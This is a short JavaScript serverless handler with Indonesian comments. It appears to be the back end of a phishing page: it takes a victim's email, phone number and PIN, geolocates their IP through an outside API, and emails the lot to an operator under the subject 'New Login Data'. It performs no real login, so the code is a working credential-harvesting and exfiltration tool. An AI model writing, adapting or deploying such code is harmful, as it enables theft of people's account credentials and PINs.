import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  try {
    const { email, phone, pin } = req.body;

    // ambil IP (x-forwarded-for dipakai kalau di hosting seperti vercel)
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "Unknown";

    // ambil info dari API kamu
    let ipInfo = {};
    try {
      const resp = await fetch(`https://cihuy-lovat.vercel.app/api/ip-checker?ip=${ip}`);
      ipInfo = await resp.json();
    } catch (err) {
      console.error("Gagal ambil data IP:", err);
    }

    // setup transporter email
    const transporter = nodemailer.createTransport({
      service: "gmail", // atau SMTP lain
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // susun isi pesan
    let message = "";
    if (email) message += `Email: ${email}\n`;
    if (phone) message += `Phone: ${phone}\n`;
    if (pin) message += `PIN: ${pin}\n`;

    // tambahkan info ip & isp dari API
    message += `\nIP: ${ip}`;
    if (ipInfo.isp) message += `\nISP: ${ipInfo.isp}`;
    if (ipInfo.country) message += `\nCountry: ${ipInfo.country}`;
    if (ipInfo.city) message += `\nCity: ${ipInfo.city}`;
    if (ipInfo.timezone) message += `\nTimezone: ${ipInfo.timezone}`;

    await transporter.sendMail({
      from: `"Notifier" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_TO,
      subject: "New Login Data",
      text: message,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error in sendmail:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
}
